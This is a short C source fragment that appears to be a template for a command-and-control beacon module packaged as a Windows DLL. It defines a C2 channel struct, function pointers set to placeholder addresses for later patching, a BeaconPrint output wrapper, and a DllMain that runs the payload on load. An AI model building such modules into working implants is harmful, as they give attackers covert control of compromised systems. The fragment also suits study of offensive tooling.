typedef struct c2struct{
    void* pipe;
    unsigned int type;
    unsigned int interval;
    void** cryptRx;
    void** cryptTx;
} C2;
typedef int(*d_send)(C2 blank, const char* data, int len);
d_send send2 = (void*)0x1337133713371337;
C2* c2 = (void*)0x1337133713371338;
int BeaconPrint(const char* data, int len){
    return send2(*c2, data, len);
}
#define BeaconPrints(x) BeaconPrint(x, strlen(x))
int main();
BOOL APIENTRY DllMain(void* hModule, int ul_reason_for_call, void* lpReserved){ExitThread(main());}